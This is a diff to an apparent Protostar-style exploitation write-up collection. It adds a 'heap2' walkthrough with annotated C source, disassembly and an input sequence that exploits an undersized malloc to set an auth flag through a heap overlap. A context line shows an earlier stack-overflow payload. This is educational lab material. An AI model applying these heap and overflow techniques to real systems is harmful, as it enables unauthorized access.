@@ -19,6 +19,7 @@ NOTE: write ups in progress!
 |[Format2](#format2)|
 |[heap0](#heap0)|
 |[heap1](#heap1)|
+|[heap2](#heap2)|
 |[net0](#net0)|
 |[net1](#net1)|
 |[net2](#net2)|
@@ -1728,12 +1729,12 @@ run $(python -c "print 'a'*20+'\x9c\xd0\xff\xff'") $(python -c "print '\x94\x84\
 #include <sys/types.h>
 #include <stdio.h>
 
-struct auth {     //define some struct
+struct auth {     //define struct auth
   char name[32];
   int auth;
 };
 
-struct auth *auth; //pointer to that struct
+struct auth *auth; //pointer to struct
 char *service;      //pointer to char
 
 int main(int argc, char **argv)
@@ -1746,7 +1747,7 @@ int main(int argc, char **argv)
       if(fgets(line, sizeof(line), stdin) == NULL) break; //fgets to our buffer from stdin
       
       if(strncmp(line, "auth ", 5) == 0) {    //if input = auth
-          auth = malloc(sizeof(auth));        //allocate memory for struct auth
+          auth = malloc(sizeof(auth));        //allocate memory for struct auth (based on size of pointer auth!)
           memset(auth, 0, sizeof(auth));      //zero out
           if(strlen(line + 5) < 31) {         // check size of input after auth is <31
               strcpy(auth->name, line + 5);   // if so, copy to name field of auth struct (32 bytes)
@@ -1755,11 +1756,11 @@ int main(int argc, char **argv)
       if(strncmp(line, "reset", 5) == 0) {  // if you enter reset, free auth
           free(auth);
       }
-      if(strncmp(line, "service", 6) == 0) {  //set service with "service x"
+      if(strncmp(line, "service", 6) == 0) {  //strdups input into auth->name
           service = strdup(line + 7);
       }
       if(strncmp(line, "login", 5) == 0) {   //if you enter login
-          if(auth->auth) {                   //check auth field of struct
+          if(auth->auth) {                   //check auth field of struct is set
               printf("you have logged in already!\n");
           } else {
               printf("please enter your password\n");
@@ -1770,12 +1771,33 @@ int main(int argc, char **argv)
 ```
 
 ### Walkthrough:
+For this one, we just need to set auth->auth to win. Luckily, the program only mallocs the size of the pointer, not the struct as required. You can see in the assembly, where it checks if auth is set
 
+```nasm
+8048a72:	8d 44 24 10          	lea    eax,[esp+0x10]
+ 8048a76:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048a79:	e8 ce fd ff ff       	call   804884c <strncmp@plt>
+ 8048a7e:	85 c0                	test   eax,eax
+ 8048a80:	0f 85 bc fe ff ff    	jne    8048942 <main+0xe>
+ 8048a86:	a1 f4 b5 04 08       	mov    eax,ds:0x804b5f4
+ 8048a8b:	8b 40 20             	mov    eax,DWORD PTR [eax+0x20] <---- 0x20 offset (or 32 decimal)
+ 8048a8e:	85 c0                	test   eax,eax
+ 8048a90:	74 11                	je     8048aa3 <main+0x16f>
+ 8048a92:	c7 04 24 a7 ad 04 08 	mov    DWORD PTR [esp],0x804ada7
+```
+We cant do a simple overflow because of the constraint of less than 31, but we can use the service feature to throw dat into our struct and overwrite the auth bit
 
 ### winning command:
+
 ```bash
-```
-### Python exploit:
-```python
+[ auth = (nil), service = (nil) ]
+auth xxxx
+[ auth = 0x95bb008, service = (nil) ]
+service aaaaaaaaaaaaaaaaaaaaaaaaaa
+[ auth = 0x95bb008, service = 0x95bb018 ]
+login
+you have logged in already!
+[ auth = 0x95bb008, service = 0x95bb018 ]
+
 ```
 
